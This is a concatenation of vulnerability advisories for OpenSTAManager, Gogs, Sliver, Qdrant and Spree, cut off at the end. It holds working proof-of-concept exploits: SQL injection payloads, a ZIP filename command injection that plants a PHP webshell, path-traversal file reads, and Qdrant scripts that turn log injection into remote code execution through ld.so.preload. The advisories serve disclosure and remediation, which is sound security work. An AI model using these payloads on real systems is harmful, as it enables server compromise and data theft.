'openstamanager')\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_search.php?term=%22%20AND%20SUBSTRING(DATABASE(),1,1)=%27o%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)%20OR%20%221%22=%221\" \\\n  > /dev/null\n# Result: real 170.32s\n\n# Test with wrong character 'x' - should be fast\ntime curl -s -b /tmp/cookies.txt \\\n  \"http://localhost:8081/ajax_search.php?term=%22%20AND%20SUBSTRING(DATABASE(),1,1)=%27x%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)%20OR%20%221%22=%221\" \\\n  > /dev/null\n# Result: real 0m0.30s\n```\n\n<img width=\"1364\" height=\"349\" alt=\"image\" src=\"https://github.com/user-attachments/assets/a1d8a7d8-bb1a-49cd-8400-136ae5e359f1\" />\n\n\n### Impact\n\n**Affected Users:** All authenticated users with access to the global search functionality.\n\n- Complete database exfiltration including customer PII, financial records, business secrets\n- Extraction of password hashes for offline cracking\n- Amplified time-based attacks consume 85x server resources per request\n\n**Recommended Fix:**\n\nReplace all instances of direct `$term` concatenation with `prepare()`:\n\n**BEFORE (Vulnerable):**\n```php\n$query .= ' OR '.$value.' LIKE \"%'.$term.'%\"';\n```\n\n**AFTER (Fixed):**\n```php\n$query .= ' OR '.$value.' LIKE '.prepare('%'.$term.'%');\n```\n\n**Apply this fix to ALL affected files:**\n1. `/modules/articoli/ajax/search.php` - Line 51\n2. `/modules/ordini/ajax/search.php` - Lines 43, 47, 79\n3. `/modules/ddt/ajax/search.php` - Lines 43, 47, 83\n4. `/modules/fatture/ajax/search.php` - Lines 45, 49, 85\n5. `/modules/preventivi/ajax/search.php` - Lines 45, 49, 83\n6. `/modules/anagrafiche/ajax/search.php` - Lines 62, 107, 162\n7. `/modules/impianti/ajax/search.php` - Line 46",

The vulnerability allows an authenticated user with write access to a repository's wiki to delete arbitrary files on the server by manipulating the `old_title` parameter in the wiki editing form.\n\n### Vulnerability Deatils\nThe vulnerability is located in `internal/database/wiki.go`. When updating a wiki page, the application accepts an `old_title` parameter to identify the potential rename operation. This parameter is used directly in `path.Join` and `os.Remove` without proper sanitization.\n\nCode snippet from `internal/database/wiki.go`:\n```go\n// Line 114\nos.Remove(path.Join(localPath, oldTitle+\".md\"))\n```\n\nIf an attacker provides a path traversal sequence (e.g., `../../../../target`) as `old_title`, the `os.Remove` function will resolve the path relative to the wiki's local directory and delete the target file. The vulnerability is limited to deleting files that end with `.md` (due to the appended extension), but depending on the filesystem and specific `path.Join` behavior, or if critical `.md` files exist (e.g. documentation, other wikis), the impact is significant. Additionally, in some contexts, the extension might be bypassed or ignored.\n\n### Impact\n- **Denial of Service**: Deletion of critical configuration files or data (if they match the extension or via other tricks).\n- **Data Loss**: Deletion of other users' wiki pages or documentation.\n\n### Remediation\nSanitize the `oldTitle` parameter using `ToWikiPageName` (or `path.Clean` and basename validation) before using it in file operations, similar to how the new `title` is currently handled.\n\n```go\n// Recommended Fix\nif oldTitle != \"\" {\n    oldTitle = ToWikiPageName(oldTitle)\n}\n```\n\n### Reproduction Steps\n1.  Log in to Gogs as a user with write access to a repository wiki.\n2.  Intercept the `POST` request to `/repo/wiki/edit`.\n3.  Modify the `old_title` parameter to `../../../../tmp/target_file`.\n4.  Submit the request.\n5.  Observe that `/tmp/target_file.md` is deleted from the server.",

The vulnerability enables complete database read access through error-based SQL injection techniques.\n\n### Details\n\nThe vulnerability exists in `templates/scadenzario/init.php` at **line 46**, where the `id_anagrafica` parameter is directly concatenated into an SQL query without proper sanitization:\n\n**Vulnerable Code:**\n```php\nif (get('id_anagrafica') && get('id_anagrafica') != 'null') {\n    $module_query = str_replace('1=1', '1=1 AND `co_scadenziario`.`idanagrafica`=\"'.get('id_anagrafica').'\"', $module_query);\n    $id_anagrafica = get('id_anagrafica');\n}\n```\n\nThe `get()` function retrieves user input from GET/POST parameters without validation. The parameter value is directly embedded into the SQL query string using string concatenation instead of using the application's `prepare()` sanitization function, enabling SQL Injection attacks.\n\n**Root Cause:**\n- Missing use of `prepare()` function for input sanitization\n- Direct string concatenation in SQL query construction\n- No input validation or type checking\n\n**Affected Endpoint:**\n```\n/pdfgen.php?ptype=scadenzario&id_anagrafica=[INJECTION_PAYLOAD]\n```\n\n**Affected Files:**\n- `templates/scadenzario/init.php` (line 46) - **Primary vulnerability**\n- `templates/scadenzario/init.php` (lines 34, 40) - Similar pattern with date parameters\n- `pdfgen.php` - Entry point for template rendering\n\n\n---\n\n### PoC (Proof of Concept)\n\n#### Prerequisites\n- Valid authenticated session (any user role)\n\n#### Exploitation Steps\n\n**1. Confirm Vulnerability - Basic Syntax Error Test:**\n```bash\n http://localhost:8081/pdfgen.php?ptype=scadenzario&id_anagrafica=1%22%20--%20\n```\n\nSQL syntax error displayed in application response\n\n<img width=\"2195\" height=\"392\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f62ca7b4-2397-4f90-8698-6cf7f867d102\" />\n\n---\n\n**2.

An authenticated attacker can upload a ZIP file containing a .p7m file with a malicious filename to execute arbitrary system commands on the server.\n\n\n## Vulnerable Code\n**File:** `src/Util/XML.php:100`\n\n```php\npublic static function decodeP7M($file)\n{\n    $directory = pathinfo($file, PATHINFO_DIRNAME);\n    $content = file_get_contents($file);\n\n    $output_file = $directory.'/'.basename($file, '.p7m');\n\n    try {\n        if (function_exists('exec')) {\n            // VULNERABLE - No input sanitization!\n            exec('openssl smime -verify -noverify -in \"'.$file.'\" -inform DER -out \"'.$output_file.'\"', $output, $cmd);\n```\n\n**The Problem:**\n- The `$file` parameter is passed directly into `exec()` without sanitization\n- Although wrapped in double quotes, an attacker can escape them\n- The filename comes from uploaded ZIP archives (user-controlled)\n\n## Attack Vector\n\n### Entry Points:\n1. **plugins/importFE_ZIP/actions.php:126** (when automatic import is enabled)\n   ```php\n   foreach ($files_xml as $xml) {\n       if (string_ends_with($xml, '.p7m')) {\n           $file = XML::decodeP7M($directory.'/'.$xml);  // $xml from ZIP!\n   ```\n\n2. **plugins/importFE/src/FatturaElettronica.php:56** (constructor)\n   ```php\n   if (string_ends_with($name, '.p7m')) {\n       $file = XML::decodeP7M($this->file);  // $name from user input!\n   ```\n\n### Attack Flow:\n1. Attacker creates ZIP with malicious filename\n2. Upload ZIP via importFE_ZIP plugin\n3. Application extracts ZIP and iterates files\n4. For `.p7m` files, `decodeP7M()` is called\n5. Malicious filename is injected into `exec()` command\n6. Arbitrary command executes as web server user\n\n## Proof of Concept\n\n**⚠️ IMPORTANT NOTE:** PHP's `ZipArchive::extractTo()` splits filenames on `/` character. Payload must NOT contain `/` in commands. Use `cd directory && command` instead of absolute paths.\n\n### Step 1: Create Malicious ZIP\n\n```python\nimport zipfile\n\ncmd = \"cd files && echo '<?php system($_GET[\\\"c\\\"]); ?>' > SHELL.php\"\nmalicious_filename = f'invoice.p7m\";{cmd};echo \".p7m'\n\nwith zipfile.ZipFile('exploit.zip', 'w') as zf:\n    zf.writestr(malicious_filename, b\"DUMMY_P7M_CONTENT\")\n```\n\n### Step 2: Upload ZIP\n\n```http\nPOST /actions.php HTTP/1.1\nHost: localhost:8081\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBKunENXxjEx5VrRc\nCookie: PHPSESSID=10fcc3c3cdccf2466ada216d5839084b\n\n------WebKitFormBoundaryBKunENXxjEx5VrRc\nContent-Disposition: form-data; name=\"blob1\"; filename=\"exploit.zip\"\nContent-Type: application/zip\n\n[ZIP CONTENT]\n------WebKitFormBoundaryBKunENXxjEx5VrRc--\nContent-Disposition: form-data; name=\"op\"\n\nsave\n\n------WebKitFormBoundaryBKunENXxjEx5VrRc\nContent-Disposition: form-data; name=\"id_module\"\n\n14\n------WebKitFormBoundaryBKunENXxjEx5VrRc\nContent-Disposition: form-data; name=\"id_plugin\"\n\n48\n------WebKitFormBoundaryBKunENXxjEx5VrRc--\n```\n<img width=\"2539\" height=\"809\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f39cf6ad-9e8d-41de-866e-e01ec2064fd1\" />\n\n<img width=\"1543\" height=\"659\" alt=\"image\" src=\"https://github.com/user-attachments/assets/41fbd038-0bce-4b1c-bdc3-8ddcf3bf13be\" />\n\n### Step 3: Exploitation Result\n\n**Response (500 error is expected - XML parsing fails AFTER command execution):**\n```http\nHTTP/1.1 500 Internal Server Error\n{\"error\":{\"type\":\"Exception\",\"message\":\"Start tag expected, '<' not found\"}}\n```\n\n**Verification - Webshell Created:**\n\n<img width=\"1111\" height=\"239\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d2e36cf3-c438-4509-be46-36d5c6f3e0d1\" />\n\n### Step 4: Remote Code Execution\n\n**Webshell is publicly accessible without authentication:**\n\n```bash\n$ curl \"http://localhost:8081/files/SHELL.php?c=id\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n$ curl \"http://localhost:8081/files/SHELL.php?c=cat+/etc/passwd\"\n[Full /etc/passwd output]\n```\n<img width=\"698\" height=\"475\" alt=\"image\" src=\"https://github.com/user-attachments/assets/7ee4630b-95a8-450c-bdce-d6f703c8168d\" />\n\n\n## Impact\n\n- **Remote Code Execution:** Full server compromise\n- **Data Exfiltration:** Access to all application data and database\n- **Privilege Escalation:** Potential escalation if web server runs with elevated privileges\n- **Persistence:** Install backdoors and maintain access\n- **Lateral Movement:** Pivot to other systems on the network\n\n## Prerequisites\n\n- Authenticated user with access to invoice import functionality\n\n## Remediation\n\n###  Input Sanitization\n\n```php\npublic static function decodeP7M($file)\n{\n    // Validate that file path doesn't contain shell metacharacters\n    if (preg_match('/[;&|`$(){}\\\\[\\\\]<>]/', $file)) {\n        throw new \\Exception('Invalid file path');\n    }\n\n    // Better: use escapeshellarg()\n    $safe_file = escapeshellarg($file);\n    $safe_output = escapeshellarg($output_file);\n\n    exec(\"openssl smime -verify -noverify -in $safe_file -inform DER -out $safe_output\", $output, $cmd);\n}\n```\nor\n\n### Validate Filename Before Processing\n\n```php\n// In the upload handler, validate filenames from ZIP\nforeach ($files_xml as $xml) {\n    // Only allow alphanumeric, dots, dashes, underscores\n    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $xml)) {\n        continue; // Skip invalid filenames\n    }\n\n    if (string_ends_with($xml, '.p7m')) {\n        $file = XML::decodeP7M($directory.'/'.$xml);\n    }\n}\n```\n\n\n## Credit\nDiscovered by: Łukasz Rybak",

If an attacker knows a victim’s username and password, they can use\n[Security Advisory_ 2FA Bypass via Recovery Code - Google Docs.pdf](https://github.com/user-attachments/files/21643266/Security.Advisory_.2FA.Bypass.via.Recovery.Code.-.Google.Docs.pdf)\n any unused recovery code (e.g., from their own account) to bypass the victim’s 2FA. This enables full account takeover and renders 2FA ineffective in all environments where it's enabled.\nAffected Versions\nSoftware: [Gogs](https://github.com/gogs/gogs/tree/main)\nConfirmed Version(s): All versions with 2FA support\nLikely Affected: All versions since introduction of UseRecoveryCode logic\nIntroduced Commit: [a617d52374e937db0edacfba2a26bdd14a05538e](https://github.com/gogs/gogs/commit/a617d52374e937db0edacfba2a26bdd14a05538e) \nCommit: a617d52374e937db0edacfba2a26bdd14a05538e\nAuthor: Joe Chen\nDate: Apr 5, 2017\nDescription: 2fa: initial support \n\nVulnerability Details\nThe function UseRecoveryCode in internal/database/two_factor.go fails to check that the recovery code belongs to the authenticating user. Instead, it looks for any unused recovery code:\nVulnerable Code Snippet\n```go\nfunc UseRecoveryCode(_ int64, code string) error {\n    recoveryCode := new(TwoFactorRecoveryCode)\n    has, err := x.Where(\"code = ?\", code).And(\"is_used = ?\", false).Get(recoveryCode)\n    ...\n}\n```\nAlthough the caller passes userID, it is ignored. The result is a global lookup for any unused code, allowing an attacker to submit their own recovery code during another user's login flow.\n\nCall Chain\n\nweb login handler\n  → UseRecoveryCode(userID, code)\n    → DB query without userID constraint\nProof-of-Concept (PoC)\nDescription\nThis bug is tested against the latest version of Gogs hosted on [Dockerhub](https://hub.docker.com/r/gogs/gogs). Attacker uses their own recovery code to bypass another user’s 2FA.\nSteps\nCreate attacker account A and enable 2FA. Save a code like \"abcde-fghij\".\nObtain credentials for victim B.\nAttempt login as B via web.\nWhen prompted for recovery code, submit A's code.\nLogin as B succeeds; A's code is marked as used.\n\n\nImpact\n2FA rendered ineffective for all users\nRealistic Exploitation Scenarios\nPublic Gogs instances with 2FA enabled\nDeveloper or maintainer accounts\nEnterprise self-hosted Gogs servers\nPotential Impact\nThis vulnerability critically undermines 2FA. Since recovery codes are not globally unique and lack user scoping, any attacker with victim credentials can use one of their own recovery codes to complete login as the victim — bypassing all 2FA protections. This opens the door to account hijacking, data exfiltration, and downstream supply chain compromise.\nTimeline\nAugust 2025: Discovered via GPT5\nAugust 2025: Reproduced and confirmed via PoC and sanitizer\nAug 6, 2025 - Sent to Gogs via https://github.com/gogs/gogs/security/advisories/new\n\n\nThis information is being shared by OpenAI solely for the purpose of improving security and reducing potential harm.

This is an authenticated **Path Traversal / arbitrary file read** issue, and it can expose credentials, configs, and keys.\n\n## Affected Component\n- Website content management (gRPC): `WebsiteAddContent`, `Website`, `Websites`\n- Server-side file read in `Website.ToProtobuf`\n\n## Impact\n- **Arbitrary file read** as the Sliver server OS user.\n- Exposure of sensitive data such as operator configs, TLS keys, tokens, and logs.\n\n## Root Cause\nThe server accepts and persists arbitrary website paths from the operator, then later reads from disk using that path without sanitization or containment.\n\n## Vulnerable Code References\n- `server/rpc/rpc-website.go:100` — accepts `content.Path` from operator RPC and persists it via `website.AddContent`\n- `server/db/models/website.go:52` — reads from disk with `filepath.Join(webContentDir, webcontent.Path)` without validating or constraining `webcontent.Path`\n\n## Proof of Concept (PoC)\n\n### Steps (local test)\n1. Build the server:\n   ```bash\n   go build -mod=vendor -tags go_sqlite,server -o sliver-server ./server\n   ```\n2. Create an operator config (permission `all` for website operations):\n   ```bash\n   ./sliver-server operator -n testop -l 127.0.0.1 -p 31337 -P all -o file -s /tmp\n   ```\n3. Start the daemon:\n   ```bash\n   ./sliver-server daemon -l 127.0.0.1 -p 31337\n   ```\n4. Run the PoC:\n   ```bash\n   GOFLAGS=-mod=vendor go run ./poc/website_path_traversal.go -config /tmp/testop_127.0.0.1.cfg -website poc-site -target /etc/hosts\n   ```\n\n\n### PoC Code\n```go\npackage main\n\nimport (\n\t\"context\"\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"runtime\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/bishopfox/sliver/client/assets\"\n\t\"github.com/bishopfox/sliver/client/transport\"\n\t\"github.com/bishopfox/sliver/protobuf/clientpb\"\n)\n\nfunc main() {\n\tvar (\n\t\tconfigPath  string\n\t\twebsiteName string\n\t\ttargetPath  string\n\t\twebPath     string\n\t\tmaxBytes    int\n\t)\n\tflag.StringVar(&configPath, \"config\", \"\", \"path to sliver client config (.cfg)\")\n\tflag.StringVar(&websiteName, \"website\", \"poc-site\", \"website name to use/create\")\n\tflag.StringVar(&targetPath, \"target\", \"\", \"absolute server file path to read\")\n\tflag.StringVar(&webPath, \"web-path\", \"\", \"override web path (defaults to traversal into target)\")\n\tflag.IntVar(&maxBytes, \"max-bytes\", 1024, \"max bytes of leaked content to print\")\n\tflag.Parse()\n\n\tif targetPath == \"\" {\n\t\tif runtime.GOOS == \"windows\" {\n\t\t\ttargetPath = `C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts`\n\t\t} else {\n\t\t\ttargetPath = \"/etc/passwd\"\n\t\t}\n\t}\n\n\tif webPath == \"\" {\n\t\ttrimmed := strings.TrimPrefix(targetPath, string(filepath.Separator))\n\t\twebPath = \"../../../../../../../../\" + trimmed\n\t}\n\n\tconfig, err := loadConfig(configPath)\n\tif err != nil {\n\t\tfatalf(\"config error: %v\", err)\n\t}\n\n\trpc, conn, err := transport.MTLSConnect(config)\n\tif err != nil {\n\t\tfatalf(\"connect error: %v\", err)\n\t}\n\tdefer conn.Close()\n\n\tctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)\n\tdefer cancel()\n\n\t_, err = rpc.WebsiteAddContent(ctx, &clientpb.WebsiteAddContent{\n\t\tName: websiteName,\n\t\tContents: map[string]*clientpb.WebContent{\n\t\t\twebPath: {\n\t\t\t\tPath:        webPath,\n\t\t\t\tContentType: \"text/plain\",\n\t\t\t\tContent:     []byte(\"poc\"),\n\t\t\t},\n\t\t},\n\t})\n\tif err != nil {\n\t\tfatalf(\"WebsiteAddContent failed: %v\", err)\n\t}\n\n\tresp, err := rpc.Website(ctx, &clientpb.Website{Name: websiteName})\n\tif err != nil {\n\t\tfatalf(\"Website failed: %v\", err)\n\t}\n\n\tvar leaked *clientpb.WebContent\n\tfor _, c := range resp.Contents {\n\t\tif c.Path == webPath {\n\t\t\tleaked = c\n\t\t\tbreak\n\t\t}\n\t}\n\tif leaked == nil {\n\t\tfatalf(\"did not find content for path %q\", webPath)\n\t}\n\n\tdata := leaked.Content\n\tif len(data) > maxBytes {\n\t\tdata = data[:maxBytes]\n\t}\n\n\tfmt.Printf(\"[+] target: %s\\n\", targetPath)\n\tfmt.Printf(\"[+] web-path: %s\\n\", webPath)\n\tfmt.Printf(\"[+] leaked bytes: %d\\n\", len(leaked.Content))\n\tfmt.Printf(\"[+] preview:\\n%s\\n\", string(data))\n}\n\nfunc loadConfig(path string) (*assets.ClientConfig, error) {\n\tif path != \"\" {\n\t\treturn assets.ReadConfig(path)\n\t}\n\tconfigs := assets.GetConfigs()\n\tif len(configs) == 0 {\n\t\treturn nil, fmt.Errorf(\"no configs found; use -config\")\n\t}\n\tif len(configs) > 1 {\n\t\treturn nil, fmt.Errorf(\"multiple configs found; use -config\")\n\t}\n\tfor _, c := range configs {\n\t\treturn c, nil\n\t}\n\treturn nil, fmt.Errorf(\"unexpected config error\")\n}\n\nfunc fatalf(format string, args ...any) {\n\tfmt.Fprintf(os.Stderr, format+\"\\n\", args...)\n\tos.Exit(1)\n}\n```\n\n### Expected Output (example)\n```\n[+] target: /etc/hosts\n[+] web-path: ../../../../../../../../etc/hosts\n[+] leaked bytes: 409\n[+] preview:\n127.0.0.1\tlocalhost\n...\n```\n\n## Evidence (Screenshots)\n<img width=\"930\" height=\"649\" alt=\"path-traversal-poc\" src=\"https://github.com/user-attachments/assets/53d18a4b-9da9-49db-b7c4-cf1fefe760fe\" />\n\n## Why It Works\n- `WebsiteAddContent` accepts a path like `../../../../etc/hosts` and stores it.\n- `Website` returns content by calling `Website.ToProtobuf`, which reads from disk using the stored `Path` value.\n- `filepath.Join` does not prevent traversal, so the server reads from outside the web directory.\n\n## Recommended Fix\n- Validate and reject paths that are absolute or contain `..` in `WebsiteAddContent` (server side).\n- Canonicalize paths and enforce they remain within the web content directory.\n- Avoid reading content by `Path` in `Website.ToProtobuf`; read by content ID instead.\n\n## Notes\n- This issue requires an authenticated operator account with sufficient permissions (`PermissionAll`).\n- The PoC demonstrates reading `/etc/hosts` but can target any readable server file.",

Configuration mitigation is available. It mitigates the problem completely.\n\n### For more information\n\nIf there are questions or comments about this advisory:\n\n- Security Support: [security@opencloud.eu](mailto:security@opencloud.eu)\n- Technical Support: [support@opencloud.eu](mailto:support@opencloud.eu)",

Tested on Qdrant 1.15.5\n\n### Details\n`POST /logger`\n([Source code link](https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195))\nendpoint accepts an attacker-controlled `on_disk.log_file` path.\n\nThere are no authorization checks (but authentication check is present).\n\nThis can be exploited in the following way: if configuration directory is writable and `config/local.yaml` does not exist, set log path to `config/local.yaml` and send a request with a log injection payload. The`PATCH /collections` endpoint was used with an invalid collection name to inject valid yaml.\n\nAfter running the PoC, the content of `config/local.yaml` will be:\n\n```yaml\n2025-11-11T23:52:22.054804Z  INFO actix_web::middleware::logger: 172.18.0.1 \"POST /logger HTTP/1.1\" 200 57 \"-\" \"python-requests/2.32.5\" 0.009422\n2025-11-11T23:52:22.056962Z  INFO storage::content_manager::toc::collection_meta_ops: Updating collection hui\nservice:\n    static_content_dir: ..\n\n2025-11-11T23:52:22.057530Z  INFO actix_web::middleware::logger: 172.18.0.1 \"PATCH /collections/hui%0Aservice:%0A%20%20static_content_dir:%20..%0A HTTP/1.1\" 404 113 \"-\" \"python-requests/2.32.5\" 0.001391\n```\n\nSome junk log lines are present, but they don't matter as this is still valid yaml.\n\nAfter that, if qdrant is restarted (via legitimate means or by a OOM/crash), then `local.yaml` config will have higher priority and `service.static_content_dir` will be set to `..`. In a container environment, this allows one to read all files via the web UI path.\n\nAlso overriding config file may let the attacker raise its privileges with a custom master key (remember that lowest privileges are required to access the vulnerable endpoint).\n\nRelevant requests:\n\n1. Enable on-disk logging to the config file:\n\n```bash\ncurl -sS -X POST \"http://localhost:6333/logger\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"log_level\":\"INFO\",\n    \"on_disk\":{\n      \"enabled\":true,\n      \"format\":\"text\",\n      \"log_level\":\"INFO\",\n      \"buffer_size_bytes\":1,\n      \"log_file\":\"config/local.yaml\"\n    }\n  }'\n```\n\n2. Inject YAML via a request that logs newlines (URL-encoded):\n\n```bash\ncurl -sS -X PATCH \"http://localhost:6333/collections/hui%0aservice:%0a%20%20static_content_dir:%20..%0a\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}'\n```\n\n### Full reproduction instructions\n\n1. Start Qdrant with a writable configuration directory:\n\n```sh\nsudo docker run -p 6333:6333 --name qdrant-poc -d qdrant/qdrant:v1.15.5\n```\n\n2. Run the exploit:\n\n```sh\n% python3 exploit.py --url http://localhost:6333\n[+] Logger configured\n[+] Log injection successful\n[+] Logger disabled\nRestart Qdrant cluster and press Enter to continue...\n```\n\n3. Restart the container:\n\n```sh\nsudo docker restart qdrant-poc\n```\n\n4. Resume the exploit:\n\n```sh\n<press Enter>\n[+] Passwd file retrieved\n--------------------------------\n...\n--------------------------------\n[+] Config file retrieved\n--------------------------------\n...\n```\n\n## Mitigation\n\n1. Limit usage of `/logger` endpoint to users with management privileges only (or better disable it completely).\n2. Restrict the path of the log file to a dedicated logs directory.\n\nThis vulnerability does not affect Qdrant cloud as the configuration directory is not writable.\n\n## Exploit code\n\n### `exploit_privesc.py`\n\n```python\nimport requests\nimport sys\nimport argparse\n\nparser = argparse.ArgumentParser(description=\"Exploit script for posting to Qdrant API\")\nparser.add_argument(\"--url\", required=False, help=\"Target URL for API\", default=\"http://localhost:6333\")\nparser.add_argument(\"--api-key\", required=False, help=\"API key\")\n\nargs = parser.parse_args()\n\nurl = args.url\n\nheaders = {}\nif args.api_key:\n    headers[\"api-key\"] = args.api_key\n\ns = requests.Session()\n\ns.headers.update(headers)\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"log_level\": \"INFO\",\n        \"on_disk\": {\n            \"enabled\": True,\n            \"format\": \"text\",\n            \"log_level\": \"INFO\",\n            \"buffer_size_bytes\": 1,\n            \"log_file\": \"config/local.yaml\",\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger configured\")\n\n\nres = s.patch(\n    f\"{url}/collections/%0aservice:%0a%20%20static_content_dir:%20..%0a\",\n    json={},\n)\nerror = res.json()[\"status\"][\"error\"]\n\nif \"doesn't exist!\" in error:\n    print(\"[+] Log injection successful\")\nelse:\n    print(f\"[-] Error: {error}\")\n    sys.exit(1)\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"on_disk\": {\n            \"enabled\": False,\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger disabled\")\n\ninput(\"Restart Qdrant cluster and press Enter to continue...\")\n\nres = s.get(f\"{url}/dashboard/etc/passwd\")\nres.raise_for_status()\nprint(\"[+] Passwd file retrieved\")\nprint(\"--------------------------------\")\nprint(res.text)\nprint(\"--------------------------------\")\n\nres = s.get(f\"{url}/dashboard/qdrant/config/config.yaml\")\nres.raise_for_status()\nprint(\"[+] Config file retrieved\")\nprint(\"--------------------------------\")\nprint(res.text)\nprint(\"--------------------------------\")\n```\n\n## `exploit_rce.py`\n\n```python\nimport requests\nimport argparse\nimport tempfile\nimport os\n\nTEST_COLLECTION_NAME = \"COLTEST\"\n\n\nparser = argparse.ArgumentParser(description=\"Exploit script for posting to Qdrant API\")\nparser.add_argument(\"--url\", required=False, help=\"Target URL for API\", default=\"http://localhost:6333\")\nparser.add_argument(\"--api-key\", required=False, help=\"API key\")\nparser.add_argument(\"--cmd\", default=\"touch /tmp/touched_by_rce\")\nparser.add_argument(\"--lib\", default=\"\")\n\nargs = parser.parse_args()\n\n\nassert \"'\" not in args.cmd, \"Command must not contain single quotes\"\nso_code = \"\"\"\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor))\nvoid init() {\n    unlink(\"/etc/ld.so.preload\");\n    system(\"/bin/bash -c 'XXXXXXXX'\");\n}\n\"\"\".replace('XXXXXXXX', args.cmd)\n\nwith tempfile.TemporaryDirectory() as tmpdir:\n    with open(f\"{tmpdir}/cmd_code.c\", \"w\") as f:\n        f.write(so_code)\n    os.system(f'gcc -shared -fPIC -o {tmpdir}/cmd.so {tmpdir}/cmd_code.c')\n    cmd_so = open(f'{tmpdir}/cmd.so', \"rb\").read()\n\nurl = args.url\n\nheaders = {}\nif args.api_key:\n    headers[\"api-key\"] = args.api_key\n\ns = requests.Session()\n\ns.headers.update(headers)\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"log_level\": \"INFO\",\n        \"on_disk\": {\n            \"enabled\": True,\n            \"format\": \"text\",\n            \"log_level\": \"INFO\",\n            \"buffer_size_bytes\": 1,\n            \"log_file\": \"/etc/ld.so.preload\",\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger configured\")\n\nres = s.get(\n    f\"{url}/:/qdrant/snapshots/{TEST_COLLECTION_NAME}/hui.so\",\n)\n\nprint(\"[+] Log injected\")\n\n\nres = s.post(\n    f\"{url}/logger\",\n    json={\n        \"on_disk\": {\n            \"enabled\": False,\n        },\n    },\n)\nres.raise_for_status()\nprint(\"[+] Logger disabled\")\n\n\nrsp = s.post(f\"{args.url}/collections/{TEST_COLLECTION_NAME}/snapshots/upload\", files={\"snapshot\": (\"hui.so\", cmd_so, \"application/octet-stream\")})\n\nprint(rsp.text)\n# trigger the stacktace endpoint which will run execute `/qdrant/qdrant --stacktrace`\n\ninput(\"Press Enter to continue...\")\nrsp = s.get(f\"{args.url}/stacktrace\")\nrsp.raise_for_status()\n```\n\n### Impact\nRemote code execution.",

          "html": "### Summary\nA critical IDOR vulnerability exists in Spree Commerce's guest checkout flow that allows any guest user to bind arbitrary guest addresses to their order by manipulating address ID parameters. This enables unauthorized access to other guests' personally identifiable information (PII) including names, addresses and phone numbers. The vulnerability bypasses existing ownership validation checks and affects all guest checkout transactions.\n\n### Impact\nThis issue may lead to disclosure of PII of guest users (including names, addresses and phone numbers).\n\n### Unauthenticated users can access all guest addresses (`GHSL-2026-027`)\n\nThe vulnerability stems from incomplete authorization validation in Spree's checkout address assignment logic. While nested address attributes (`bill_address_attributes[id]` and `ship_address_attributes[id]`) are properly validated through `validate_address_ownership`, plain ID parameters (`bill_address_id` and `ship_address_id`) bypass this check entirely. Since Spree's address IDs are sequential numbers, an attacker might get all guest addresses by simply enumerating over them.\n\n### Affected Code Components\n\n1. **Permitted Attributes** ([`core/lib/spree/permitted_attributes.rb:92–96`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/lib/spree/permitted_attributes.rb#L92-L96))\n   - Allows `bill_address_id` and `ship_address_id` as permitted parameters without validation\n\n2. **Checkout Update** ([`core/app/models/spree/order/checkout.rb:241–254`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/checkout.rb#L241-L254))\n   - Applies permitted parameters directly to the Order model via `update_from_params`\n\n3. **Incomplete Ownership Validation** ([`core/app/services/spree/checkout/update.rb:33–48`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/services/spree/checkout/update.rb#L33-L48))\n   - `validate_address_ownership` only validates nested attributes structure\n   - Does NOT validate plain `bill_address_id`/`ship_address_id` fields\n\n4. **Vulnerable Assignment Logic** ([`core/app/models/spree/order/address_book.rb:16–23, 31–38`](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L16-L38))\n   * [`bill_address_id=` setter](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L16-L24)\n   * [`ship_address_id=` setter](https://github.com/spree/spree/blob/1341623f2ae92685cdbe232885bf5808fc8f9ca8/core/app/models/spree/order/address_book.rb#L31-L39)\n\nBoth setters check that: `address.user_id == order.user_id`. For guest orders: nil == nil → TRUE ✓ (bypass!)\n\n#### Proof of Concept\n\nPrecondition: One guest address has to exist in Spree's database. (E.g. Create an order with a guest account and note the ID from the `spree_addresses` table. E.g. `3`)\n\nAs a guest user:\n1. Put one product in the cart and go to checkout.\n2. Fill in some address/phone number and continue.\n3. Modify this script containing a curl request with current values.\n\n```bash\n#!/bin/bash\n\nATTACKER_ORDER_TOKEN=\"\" # Taken from the URL\nVICTIM_ADDRESS_ID=\"3\" # As noted from the database\nCSRF_TOKEN=\"\" # From page source; `content` value from meta param `csrf-token`.\nSESSION_COOKIE=\"token=...; _my_store_session=...\" # from the browsers cookie store.\n\ncurl -i -X POST \\\n  -H \"x-csrf-token: ${CSRF_TOKEN}\" \\\n  -H \"Content-Type: application/x-www-form-urlencoded;charset=UTF-8\" \\\n  -b \"${SESSION_COOKIE}\" \\\n  --data-urlencode \"_method=patch\" \\\n  